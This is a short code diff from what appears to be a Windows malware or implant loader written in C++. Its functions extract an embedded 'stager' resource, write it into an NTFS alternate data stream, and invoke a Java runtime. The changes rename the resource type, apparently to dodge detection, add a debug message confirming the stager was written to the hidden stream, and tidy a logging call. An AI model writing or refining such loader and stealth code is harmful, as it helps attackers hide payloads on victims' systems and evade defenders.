@@ -396,7 +396,7 @@ bool ExtractStager( std::string passedPath){
 
 		
 		//Get the resource
-		hRes = FindResource(dll_handle, MAKEINTRESOURCE(IDR_BIN2) ,"BIN");
+		hRes = FindResource(dll_handle, MAKEINTRESOURCE(IDR_BIN2) ,"JRR");
 		if( hRes == nullptr ){
 		
 #ifdef _DBG
@@ -444,6 +444,12 @@ bool ExtractStager( std::string passedPath){
 #endif
 			free(buf);
 			return false;
+		} else {
+
+#ifdef _DBG
+			Log( "Stager written to ADS.\r\n");
+#endif
+
 		}
 		//Free mem
 		free(buf);
@@ -658,7 +664,7 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath, const cha
 	if( jvmPath == nullptr ){
 #ifdef _DBG
 		//Print the last error
-		Log("Unable to find java runtime DLL path.\n", GetLastError());					
+		Log("Unable to find java runtime DLL path.\n");					
 #endif
 		return FALSE;
 
